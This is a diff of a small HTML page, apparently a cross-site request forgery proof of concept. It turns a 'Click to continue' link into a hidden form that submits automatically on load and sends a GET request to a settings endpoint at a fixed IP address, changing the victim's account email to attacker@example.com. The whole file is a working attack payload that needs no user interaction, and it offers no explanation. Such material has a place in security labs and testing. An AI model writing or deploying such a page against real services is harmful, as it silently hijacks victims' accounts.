@@ -1,14 +1,16 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8" />
-    <title>Continue</title>
-  </head>
   <body>
-    <a
-      href="http://100.101.228.35:6009/settings/email?new=attacker%40example.com"
+    <form
+      action="http://100.101.228.35:6009/settings/email"
+      method="GET"
+      target="_top"
     >
-      Click to continue
-    </a>
+      <input type="hidden" name="new" value="attacker@example.com" />
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
   </body>
 </html>
